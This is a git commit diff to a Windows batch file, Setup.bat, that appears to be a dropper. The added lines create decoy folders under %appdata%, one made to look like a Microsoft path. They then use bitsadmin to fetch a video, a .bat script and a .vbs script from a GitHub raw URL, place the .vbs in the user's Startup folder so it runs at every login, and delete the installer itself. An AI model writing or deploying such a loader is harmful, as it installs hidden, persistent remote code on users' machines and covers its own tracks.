91b1901259fbb438ea7541877bfb8e95768c056c
RandumPerson314 <46033255+RandumPerson314@users.noreply.github.com>
2021-04-02 14:15:26 -0400

    Update Setup.bat

--- Setup.bat
+++ Setup.bat
@@ -1,7 +1,12 @@
-md "%appdata%\Decoder Studio\assets\files\logs\cache\resources\versions\web\backup "
-set downloadfolder="%appdata%\Decoder Studio\assets\files\logs\cache\resources\versions\web\backup"
+set videodownloadfolder="%appdata%\Decoder Studio\assets\files\logs\cache\resources\versions\web\backup"
+set batdownloadfolder="%appdata%\Windows64\Microsoft\Menu\Executables\Files\Start"
 set thestartupfolder="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
-bitsadmin  /transfer mydownloadjob  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/video.mp4  %downloadfolder%\video.mp4
-bitsadmin  /transfer mydownloadjob  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/StartupExecutable.bat  %thestartupfolder%\StartupExecutable.bat
-pause
-del Setup.bat
+
+md %videodownloadfolder%
+md %batdownloadfolder%
+
+bitsadmin  /transfer VideoDownload  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/video.mp4  %videodownloadfolder%\video.mp4
+bitsadmin  /transfer StartupExecutableBATDownload  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/StartupExecutable.bat  %batdownloadfolder%\StartupExecutable.bat
+bitsadmin  /transfer StartupExecutableVBSDownload  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/StartupExecutable.vbs  %thestartupfolder%\StartupExecutable.vbs
+
+del "%~f0"
